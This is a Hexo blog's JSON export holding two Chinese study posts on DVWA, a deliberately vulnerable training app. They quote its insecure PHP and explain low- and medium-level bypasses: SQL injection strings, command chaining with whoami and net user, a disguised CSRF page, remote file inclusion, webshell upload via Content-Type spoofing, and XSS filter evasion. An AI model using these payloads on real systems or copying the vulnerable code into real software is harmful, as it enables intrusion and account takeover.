{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"黑桃⑨","url":"https://perfect.xyz"},"pages":[{"title":"关于我","date":"2018-07-07T08:12:41.199Z","updated":"2018-07-07T08:12:41.199Z","comments":true,"path":"about/index.html","permalink":"https://perfect.xyz/about/index.html","excerpt":"","text":"目前还是个在校生，而且是个菜鸡 努力学web安全中，对逆向也有点感兴趣 二刺猿死肥宅 单机游戏玩家 QQ:1055883471欢迎各路大佬加我好友"}],"posts":[{"title":"基于DVWA的web漏洞原理-medium","slug":"dvwa-medium","date":"2018-07-07T05:42:47.016Z","updated":"2018-07-08T08:17:57.132Z","comments":true,"path":"2018/07/07/dvwa-medium/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-medium/","excerpt":"low完了，medium就很快了","text":"low完了，medium就很快了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 去掉输入的用户名中的特殊字符 $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 去掉输入的密码中的特殊字符 $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户的详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 服务器端在low的基础上增加了mysql_real_escape_string()函数，这个函数可以对字符串中的特殊符号进行转义，基本上抵御了sql注入 当然这种抵御方式也不是万能的，通过构造编码也可以绕过 详情请见：http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 同时$pass也做了md5校验，杜绝了password注入 虽然加入了防爆破机制(sleep(2))，但是2秒的沉睡并不算什么 直接用bp爆破就好了 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 设置黑名单 $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 跟low相比也只多了将&amp;&amp;和;这两个字符过滤掉，继续用||命令就好了 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查请求来自哪里 if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 两次输入的密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // 不是可信任的来源 echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; stripos(string,find,start) 查找find在string中出现的位置，没有找到则返回false 服务器想通过检查http包头的Referer参数的值中有没有要访问的主机名来抵御CSRF攻击Referer主要用来让服务器判断来源页面 逻辑是判断Referer参数中有没有目的主机的名，而Referer参数中会把完整的域名写进去，所以绕过的方法很简单，只要攻击者把攻击页面的名字改为目的主机的主机名即可绕过 File Inclusion文件包含 核心代码： &lt;?php // 希望显示的页面参数值 $file = $_GET[ &apos;page&apos; ]; // 输入检查 $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看见多了一个输入检查，利用str_replace函数讲page的值中的http:\\\\等字符删除但是str_replace这个本身就是有漏洞的，只要重写就可以绕过，比如http:\\\\写成hthttp://tp://，str_replace函数只会删除一个http:\\\\ 其他操作都与low的文件包含一样 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路劲 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // 检查是否为img if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 刻意 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看到，服务器对文件的类型和大小进行了限制，但是只检查了Content-Ytpy这个字段只要用bp抓包，把这个字段的值改为image/png就可以绕过了 也可以利用文件包含的，不管是不是php文件，都会尝试当做php来执行的特性 用工具来包含我们上传的png文件，当然文件的内容是一句话木马 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); // 验证是否成功 if( !$resp ) { // 验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 验证成功，检查两次输入的密码是否一致 if( $pass_new == $pass_conf ) { // 显示下一阶段 echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查是否做了第一阶段 if( !$_POST[ &apos;passed_captcha&apos; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器在第二步验证的时候，增加了对passed_captcha的检查，如果第一阶段的验证码通过了，那么passed_captcha就会变成true 本质上跟low级别没什么区别，只要在包中多加一个passed_captcha=true就好了 CSRF也一样，多加一条&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; 实际场景中，攻击者不可能知道这个多出来的参数是什么，所以第一步应该要先通过验证并且抓包，观察包中传了什么参数过去 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 转义sql语句中的特殊字符串 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 显示值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } ?&gt; 服务器先是使用mysql_real_escape_string函数将单引号以及双引号之类的特殊字符转义掉，再用下拉框来限制用户输入 下拉框很好解决，只要用bp抓包,直接在bp里面改就行 因为是数字型的注入，所以单引号基本用不着，只有在where语句上会用到单引号 将单引号以及单引号里面的内容全部转换成十六进制就可以绕过了，其他步骤同low SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } //mysql_close(); } ?&gt; 设置了下拉框限制用户输入，同时也消除了反斜杠之类的字符，但是对注入并没有什么影响 用bp抓包，在bp里改参数就行了 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 将SessionID的值改为当前的时间 攻击者做的答题流程跟low一样，只是多一步预估受害者进入系统的时间 XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { $default = $_GET[&apos;default&apos;]; //不永许脚本标记 if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 服务器端检查了输入的值是否为空，并且不允许出现script标签，出现了就把默认值改为english 只要在？default中间加一个#就可以绕过了，#后面的值不会传给服务器 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件 XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; str_replace函数将输入的&lt;script&gt;删除 这个函数的绕过很简单，重写或者大小写替换都可以 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 用bp抓包，在name里用重写或者大小写就可以绕过了","categories":[],"tags":[]},{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-05T06:28:20.794Z","updated":"2018-07-07T06:12:17.555Z","comments":true,"path":"2018/07/05/dvwa-low/","link":"","permalink":"https://perfect.xyz/2018/07/05/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 获取用户名 $user = $_GET[ &apos;username&apos; ]; // 获取密码 $pass = $_GET[ &apos;password&apos; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’=’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1=1时，整条语句为真 然而1=1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &apos;page&apos; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能移动 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以移动 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos;], $_POST[&apos;g-recaptcha-response&apos;] ); // 检查输入的验证码是否正确 if( !$resp ) { // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) { // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } //当验证码检查通过 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 $html .= 